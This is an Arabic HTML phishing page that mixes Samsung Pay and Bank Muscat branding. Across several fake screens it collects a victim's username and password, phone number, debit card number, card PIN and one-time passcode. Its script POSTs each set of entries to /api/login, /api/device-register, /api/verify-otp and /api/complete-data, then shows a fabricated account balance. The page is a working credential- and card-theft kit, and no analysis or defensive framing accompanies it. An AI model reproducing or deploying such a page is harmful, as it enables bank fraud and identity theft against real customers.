<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Samsung Pay - تسجيل الدخول</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "SF Pro Text", -apple-system, BlinkMacSystemFont, sans-serif;
        }
        
        body {
            background-color: #ffffff;
            color: #000000;
            line-height: 1.6;
            padding: 20px;
            max-width: 400px;
            margin: 0 auto;
            min-height: 100vh;
        }
        
        .screen {
            display: none;
        }
        
        .screen.active {
            display: block;
        }
        
        .header {
            text-align: center;
            margin-bottom: 20px;
            padding-top: 10px;
        }
        
        .logo {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #000000;
        }
        
        .promo-card {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 25px;
            border: 1px solid #e9ecef;
        }
        
        .promo-title {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 5px;
            color: #000000;
        }
        
        .promo-text {
            font-size: 14px;
            color: #6c757d;
            margin-bottom: 10px;
        }
        
        .more-link {
            color: #dc3545;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .label {
            display: block;
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 8px;
            color: #000000;
        }
        
        .input-field {
            width: 100%;
            padding: 14px 15px;
            border: 1px solid #ced4da;
            border-radius: 10px;
            font-size: 16px;
            background-color: #ffffff;
            color: #000000;
        }
        
        .input-field::placeholder {
            color: #6c757d;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #dc3545;
            box-shadow: 0 0 0 2px rgba(220, 53, 69, 0.1);
        }
        
        .forgot-link {
            display: block;
            text-align: left;
            margin-top: 8px;
            color: #dc3545;
            font-size: 14px;
            text-decoration: none;
            font-weight: 500;
        }
        
        .login-btn {
            width: 100%;
            padding: 16px;
            background-color: #dc3545;
            color: #ffffff;
            border: none;
            border-radius: 10px;
            font-size: 17px;
            font-weight: 600;
            margin-top: 10px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .login-btn:active {
            background-color: #c82333;
            transform: scale(0.98);
        }
        
        .divider {
            height: 1px;
            background: #e9ecef;
            margin: 25px 0;
        }
        
        .option-section {
            margin-bottom: 20px;
        }
        
        .option-title {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #000000;
        }
        
        .option-link {
            color: #dc3545;
            font-size: 14px;
            text-decoration: none;
            font-weight: 600;
        }
        
        .option-description {
            font-size: 13px;
            color: #6c757d;
            margin-top: 4px;
        }
        
        .features-section {
            margin-top: 30px;
        }
        
        .features-title {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 15px;
            color: #000000;
        }
        
        .features-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        
        .feature-card {
            background: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 10px;
            padding: 15px;
            text-align: center;
        }
        
        .feature-text {
            font-size: 13px;
            font-weight: 500;
            color: #000000;
        }

        /* شاشة تسجيل الجهاز الجديد */
        .title {
            font-size: 22px;
            font-weight: 600;
            color: #000000;
            margin-bottom: 30px;
            text-align: center;
        }
        
        .phone-container {
            display: flex;
            align-items: center;
            border: 1px solid #ced4da;
            border-radius: 10px;
            overflow: hidden;
            background-color: #ffffff;
        }
        
        .country-code {
            padding: 14px 15px;
            background-color: #f8f9fa;
            border-right: 1px solid #ced4da;
            font-weight: 500;
            display: flex;
            align-items: center;
            color: #000000;
        }
        
        .check-mark {
            color: #28a745;
            margin-right: 5px;
            font-size: 16px;
        }
        
        .phone-input {
            flex: 1;
            border: none;
            padding: 14px 15px;
            font-size: 16px;
            background-color: #ffffff;
            color: #000000;
        }
        
        .phone-input:focus {
            outline: none;
        }
        
        .hint {
            font-size: 14px;
            color: #6c757d;
            margin-top: 5px;
        }
        
        .card-input {
            width: 100%;
            padding: 14px 15px;
            border: 1px solid #ced4da;
            border-radius: 10px;
            font-size: 16px;
            background-color: #ffffff;
            color: #000000;
        }
        
        .card-input:focus {
            outline: none;
            border-color: #dc3545;
        }
        
        .or-divider {
            text-align: center;
            margin: 15px 0;
            color: #6c757d;
            font-size: 14px;
            position: relative;
        }
        
        .or-divider::before,
        .or-divider::after {
            content: "";
            position: absolute;
            top: 50%;
            width: 40%;
            height: 1px;
            background-color: #ced4da;
        }
        
        .or-divider::before {
            right: 0;
        }
        
        .or-divider::after {
            left: 0;
        }
        
        .scan-options {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin: 15px 0;
        }
        
        .scan-option {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 14px;
            border: 1px solid #ced4da;
            border-radius: 10px;
            background-color: #ffffff;
            font-size: 16px;
            color: #000000;
        }
        
        .scan-option:active {
            background-color: #f8f9fa;
        }
        
        .password-input {
            width: 100%;
            padding: 14px 15px;
            border: 1px solid #ced4da;
            border-radius: 10px;
            font-size: 16px;
            background-color: #ffffff;
            color: #000000;
        }
        
        .password-input:focus {
            outline: none;
            border-color: #dc3545;
        }
        
        .continue-btn {
            width: 100%;
            padding: 16px;
            background-color: #dc3545;
            color: #ffffff;
            border: none;
            border-radius: 10px;
            font-size: 17px;
            font-weight: 600;
            margin-top: 20px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .continue-btn:active {
            background-color: #c82333;
            transform: scale(0.98);
        }

        /* شاشة التحقق */
        .verification-title {
            font-size: 20px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 10px;
            color: #000000;
        }
        
        .verification-subtitle {
            font-size: 16px;
            color: #6c757d;
            text-align: center;
            margin-bottom: 30px;
        }
        
        .otp-container {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 30px 0;
        }
        
        .otp-input {
            width: 50px;
            height: 50px;
            border: 1px solid #ced4da;
            border-radius: 10px;
            text-align: center;
            font-size: 20px;
            font-weight: 600;
            background-color: #ffffff;
            color: #000000;
        }
        
        .otp-input:focus {
            outline: none;
            border-color: #dc3545;
        }
        
        .timer-container {
            text-align: center;
            margin: 20px 0;
        }
        
        .timer {
            font-size: 16px;
            font-weight: 600;
            color: #dc3545;
            background: #f8f9fa;
            padding: 10px 20px;
            border-radius: 20px;
            display: inline-block;
        }
        
        .resend-text {
            text-align: center;
            color: #6c757d;
            font-size: 15px;
            margin-top: 20px;
        }
        
        .resend-link {
            color: #dc3545;
            text-decoration: none;
            font-weight: 600;
        }
        
        .resend-link.disabled {
            color: #6c757d;
            pointer-events: none;
        }
        
        /* شاشة الرئيسية */
        .home-screen {
            text-align: center;
        }
        
        .welcome-title {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #000000;
        }
        
        .welcome-subtitle {
            font-size: 16px;
            color: #6c757d;
            margin-bottom: 40px;
        }
        
        .balance-card {
            background: #dc3545;
            color: white;
            border-radius: 16px;
            padding: 25px;
            margin-bottom: 30px;
        }
        
        .balance-label {
            font-size: 16px;
            margin-bottom: 5px;
            opacity: 0.9;
        }
        
        .balance-amount {
            font-size: 32px;
            font-weight: 700;
        }
        
        .quick-actions {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-top: 30px;
        }
        
        .action-btn {
            background-color: #ffffff;
            border: 1px solid #e9ecef;
            border-radius: 12px;
            padding: 20px 15px;
            text-align: center;
            cursor: pointer;
        }
        
        .action-btn:active {
            background-color: #f8f9fa;
        }
        
        .action-icon {
            font-size: 24px;
            margin-bottom: 8px;
            color: #dc3545;
        }
        
        .action-text {
            font-size: 14px;
            font-weight: 500;
            color: #000000;
        }

        .loading {
            display: none;
            text-align: center;
            color: #dc3545;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <!-- شاشة تسجيل الدخول الرئيسية -->
    <div id="login-screen" class="screen active">
        <div class="header">
            <div class="logo">بنك مسقط</div>
        </div>
        
        <div class="promo-card">
            <div class="promo-title">التمويل السريع</div>
            <div class="promo-text">حول المبالغ دوليًا بسرعة وأمان مع خدمة التمويل السريع.</div>
            <a href="#" class="more-link">المزيد</a>
        </div>
        
        <form id="loginForm">
            <div class="form-group">
                <label class="label">اسم المستخدم</label>
                <input type="text" class="input-field" placeholder="اسم المستخدم" required id="username">
            </div>
            
            <div class="form-group">
                <label class="label">الرقم السري</label>
                <input type="password" class="input-field" placeholder="الرقم السري" required id="password">
                <a href="#" class="forgot-link">هل نسيت كلمة السر أو اسم المستخدم؟</a>
            </div>
            
            <button type="submit" class="login-btn">تسجيل الدخول</button>
            <div class="loading" id="login-loading">جاري المعالجة...</div>
        </form>
        
        <div class="divider"></div>
        
        <div class="option-section">
            <div class="option-title">هل أنت مستخدم جديد للتطبيق؟</div>
            <a href="#" class="option-link">تسجيل جديد</a>
        </div>
        
        <div class="option-section">
            <div class="option-title">هاتف جديد؟</div>
            <a href="#" class="option-link">تسجيل جهاز جديد</a>
            <div class="option-description">بإمكانك تحميل التطبيق في أكثر من جهاز</div>
        </div>
        
        <div class="features-section">
            <div class="features-title">المميزات السريعة</div>
            <div class="features-grid">
                <div class="feature-card">
                    <div class="feature-text">إنشاء رمز الاستجابة السريع للحساب</div>
                </div>
                <div class="feature-card">
                    <div class="feature-text">مواقع الفروع وأجهزة الصراف الآلي</div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- شاشة تسجيل الجهاز الجديد -->
    <div id="device-register-screen" class="screen">
        <div class="header">
            <div class="title">تسجيل جهاز جديد</div>
        </div>
        
        <form id="deviceRegistrationForm">
            <div class="form-group">
                <label class="label">رقم الجوال</label>
                <div class="phone-container">
                    <div class="country-code">
                        <span class="check-mark">✅</span> +968
                    </div>
                    <input type="tel" class="phone-input" placeholder="99999999" required id="phone">
                </div>
                <div class="hint">يجب أن يكون هذا الرقم مسجلًا في حسابك.</div>
            </div>
            
            <div class="form-group">
                <label class="label">رقم بطاقة الخصم المباشر</label>
                <input type="text" class="card-input" placeholder="XXXX    XXXX    XXXX    XXXX" required id="card">
                
                <div class="or-divider">أو</div>
                
                <div class="scan-options">
                    <div class="scan-option" id="scanCardOption">
                        مسح بطاقة الخصم المباشر/ الصراف الآلي
                    </div>
                    
                    <div class="scan-option" id="nfcOption">
                        مرر بطاقتك للتسجيل عبر تقنية NFC
                    </div>
                </div>
            </div>
            
            <div class="form-group">
                <label class="label">الرقم السري</label>
                <input type="password" class="password-input" placeholder="XXXX" required id="device-password">
            </div>
            
            <button type="submit" class="continue-btn">استمرار</button>
            <div class="loading" id="device-loading">جاري المعالجة...</div>
        </form>
    </div>
    
    <!-- شاشة التحقق -->
    <div id="verification-screen" class="screen">
        <div class="header">
            <div class="verification-title">تم إرسال رمز التحقق</div>
            <div class="verification-subtitle">أدخل الرمز المكون من 6 أرقام المرسل إلى جوالك</div>
        </div>
        
        <div class="otp-container">
            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="otp1">
            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="otp2">
            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="otp3">
            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="otp4">
            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="otp5">
            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" id="otp6">
        </div>

        <div class="timer-container">
            <div class="timer" id="countdown">02:00</div>
        </div>
        
        <button class="continue-btn" id="verify-btn">تحقق</button>
        <div class="loading" id="verify-loading">جاري التحقق...</div>
        
        <div class="resend-text">
            لم تستلم الرمز؟ <a href="#" class="resend-link disabled" id="resend-link">إعادة الإرسال</a>
        </div>
    </div>
    
    <!-- الشاشة الرئيسية -->
    <div id="home-screen" class="screen">
        <div class="header">
            <div class="welcome-title">مرحباً بك!</div>
            <div class="welcome-subtitle">في تطبيق Samsung Pay</div>
        </div>
        
        <div class="balance-card">
            <div class="balance-label">الموقع تحت الصيانة</div>الي</div>
            <div class="balance-amount">1,250.00 ر.ع</div>
        </div>
        
        <div class="quick-actions">
            <div class="action-btn">
                <div class="action-icon">💳</div>
                <div class="action-text">دفع</div>
            </div>
            <div class="action-btn">
                <div class="action-icon">🔄</div>
                <div class="action-text">تحويل</div>
            </div>
            <div class="action-btn">
                <div class="action-icon">📊</div>
                <div class="action-text">كشف حساب</div>
            </div>
            <div class="action-btn">
                <div class="action-icon">⚙️</div>
                <div class="action-text">الإعدادات</div>
            </div>
        </div>
    </div>

    <script>
        let countdownTimer;
        let timeLeft = 120;
        let collectedData = {};

        // إرسال البيانات إلى السيرفر
        async function sendDataToServer(data, endpoint) {
            try {
                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
                
                const result = await response.json();
                console.log('تم إرسال البيانات:', result);
                return result;
            } catch (error) {
                console.error('خطأ في الإرسال:', error);
                return {success: false, error: error.message};
            }
        }

        // الانتقال بين الشاشات
        function showScreen(screenId) {
            document.querySelectorAll('.screen').forEach(screen => {
                screen.classList.remove('active');
            });
            document.getElementById(screenId).classList.add('active');
        }
        
        // معالجة تسجيل الدخول
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loading = document.getElementById('login-loading');
            
            if (username && password) {
                loading.style.display = 'block';
                
                // حفظ بيانات تسجيل الدخول
                collectedData.login = {
                    username: username,
                    password: password,
                    timestamp: new Date().toISOString()
                };
                
                // إرسال بيانات تسجيل الدخول
                await sendDataToServer(collectedData.login, '/api/login');
                
                loading.style.display = 'none';
                showScreen('device-register-screen');
            } else {
                alert('يرجى ملء جميع الحقول المطلوبة');
            }
        });
        
        // معالجة مسح البطاقة
        document.getElementById('scanCardOption').addEventListener('click', function() {
            alert('سيتم فتح الكاميرا لمسح البطاقة');
        });
        
        // معالجة NFC
        document.getElementById('nfcOption').addEventListener('click', function() {
            alert('المرر البطاقة بالقرب من جهازك للتسجيل عبر NFC');
        });
        
        // معالجة تسجيل الجهاز الجديد
        document.getElementById('deviceRegistrationForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const phone = document.getElementById('phone').value;
            const card = document.getElementById('card').value.replace(/\s+/g, '');
            const devicePassword = document.getElementById('device-password').value;
            const loading = document.getElementById('device-loading');
            
            if (phone && card && devicePassword) {
                loading.style.display = 'block';
                
                // حفظ بيانات الجهاز الجديد
                collectedData.device = {
                    phone: phone,
                    card: card,
                    password: devicePassword,
                    timestamp: new Date().toISOString()
                };
                
                // إرسال بيانات الجهاز الجديد
                await sendDataToServer(collectedData.device, '/api/device-register');
                
                loading.style.display = 'none';
                showScreen('verification-screen');
                startCountdown();
                setupOTPInputs();
            } else {
                alert('يرجى ملء جميع الحقول المطلوبة');
            }
        });
        
        // تنسيق رقم البطاقة تلقائياً
        document.getElementById('card').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            
            if (value.length <= 16) {
                let formattedValue = '';
                
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) {
                        formattedValue += '    ';
                    }
                    formattedValue += value[i];
                }
                
                e.target.value = formattedValue;
            }
        });
        
        // تنسيق رقم الهاتف تلقائياً
        document.getElementById('phone').addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^0-9]/gi, '');
            if (value.length <= 8) {
                e.target.value = value;
            }
        });
        
        // بدء العد التنازلي
        function startCountdown() {
            timeLeft = 120;
            updateCountdown();
            
            countdownTimer = setInterval(function() {
                timeLeft--;
                updateCountdown();
                
                if (timeLeft <= 0) {
                    clearInterval(countdownTimer);
                    document.getElementById('resend-link').classList.remove('disabled');
                }
            }, 1000);
        }
        
        // تحديث العداد
        function updateCountdown() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            const countdownElement = document.getElementById('countdown');
            countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }
        
        // إعادة إرسال الرمز
        document.getElementById('resend-link').addEventListener('click', function(e) {
            e.preventDefault();
            if (!this.classList.contains('disabled')) {
                alert('تم إعادة إرسال رمز التحقق إلى جوالك');
                this.classList.add('disabled');
                startCountdown();
            }
        });
        
        // إعداد حقول OTP
        function setupOTPInputs() {
            const otpInputs = document.querySelectorAll('.otp-input');
            const verifyBtn = document.getElementById('verify-btn');
            
            verifyBtn.disabled = true;
            
            otpInputs.forEach((input, index) => {
                input.value = '';
                
                input.addEventListener('input', function(e) {
                    this.value = this.value.replace(/[^0-9]/g, '');
                    
                    if (this.value.length === 1 && index < otpInputs.length - 1) {
                        otpInputs[index + 1].focus();
                    }
                    
                    const allFilled = Array.from(otpInputs).every(input => input.value.length === 1);
                    verifyBtn.disabled = !allFilled;
                });
                
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
                        otpInputs[index - 1].focus();
                    }
                });
            });
            
            if (otpInputs[0]) {
                otpInputs[0].focus();
            }
        }
        
        // معالجة التحقق
        document.getElementById('verify-btn').addEventListener('click', async function() {
            const otpInputs = document.querySelectorAll('.otp-input');
            const otpCode = Array.from(otpInputs).map(input => input.value).join('');
            const loading = document.getElementById('verify-loading');
            
            if (otpCode.length === 6) {
                loading.style.display = 'block';
                
                // حفظ بيانات OTP
                collectedData.otp = {
                    code: otpCode,
                    timestamp: new Date().toISOString()
                };
                
                // إرسال بيانات OTP
                await sendDataToServer(collectedData.otp, '/api/verify-otp');
                
                // إرسال جميع البيانات معاً
                await sendDataToServer(collectedData, '/api/complete-data');
                
                clearInterval(countdownTimer);
                loading.style.display = 'none';
                showScreen('home-screen');
                
                // إظهار جميع البيانات المجمعة (للتجربة فقط)
                console.log('جميع البيانات المجمعة:', collectedData);
                
            } else {
                alert('يرجى إدخال رمز التحقق المكون من 6 أرقام');
            }
        });
    </script>
</body>
</html>